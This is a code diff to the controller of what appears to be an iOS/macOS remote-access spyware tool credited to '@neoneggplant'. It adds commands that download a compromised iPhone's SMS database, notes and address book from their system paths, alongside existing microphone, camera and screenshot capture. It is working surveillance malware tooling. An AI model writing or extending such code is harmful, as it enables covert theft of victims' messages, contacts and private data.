@@ -44,7 +44,7 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.9.2\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.9.3\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
@@ -52,6 +52,12 @@ BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     4): Exit
 """ + WHITE + "-"*40
 BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
+
+iosshortcuts = {
+    "getsms":"download /var/mobile/Library/SMS/sms.db",
+    "getnotes":"download /var/mobile/Library/Notes/notes.sqlite",
+    "getcontacts":"download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
+}
 
 def interactiveMenu():
     while 1:
@@ -154,6 +160,9 @@ def showHelp(CDA):
         showCommand("isplaying","view mediaplayer info")
         showCommand("openurl","open url on device")
         showCommand("dial","dial number on device")
+        showCommand("getsms","download sms database")
+        showCommand("getnotes","download notes database")
+        showCommand("getcontacts","download addressbook")
         showCommand("battery","get battery level")
         showCommand("lastapp","get bundle id of last app opened")
         showCommand("listapps","list bundle identifiers")
@@ -228,6 +237,12 @@ def initSHELL(name,conn,host,port,CDA):
                 title = bben(raw_input("Set title: "))
                 message = bben(raw_input("Set message: "))
                 sendCMD(args[0] + " " + title + " " + message,conn)
+                continue
+            if args[0] in iosshortcuts:
+                if iosshortcuts[args[0]].split()[0] == "download":
+                    downloadFile(iosshortcuts[args[0]],conn)
+                else:
+                    sendCMD(iosshortcuts[args[0]],conn)
                 continue
         if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
             conn.send(encryptStr(command))
@@ -340,17 +355,17 @@ def downloadFile(command,conn):
     filename = ""
     dateFormat = "%Y%m%d%H%M%S"
     if args[0] == "screenshot":
-        filename = "data/screenshot"+time.strftime(dateFormat)+".jpeg"
+        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "picture":
-        filename = "data/isight"+time.strftime(dateFormat)+".jpeg"
+        filename = "isight"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "frontcam":
-        filename = "data/frontcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "backcam":
-        filename = "data/backcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "mic":
-        filename = "data/mic"+time.strftime(dateFormat)+".aac"
+        filename = "mic"+time.strftime(dateFormat)+".aac"
     else:
-        filename = "data/"+command[9:]
+        filename = args[1].split("/")[-1]
 
     progress = 0
     file = open(os.getcwd()+"/.tmpfile", "a+b")
@@ -372,7 +387,7 @@ def downloadFile(command,conn):
             file.write(chunk)
             file.close()
             #decrypt with our shell key, remove tmp file
-            downloadedFile = open(filename,"wb")
+            downloadedFile = open("data/"+filename,"wb")
             downloadedFile.close()
             if not escrypt.decryptFile(os.getcwd()+"/.tmpfile", filename, shellKey, sizeofFile):
                 print strinfo("error decrypting data :(")
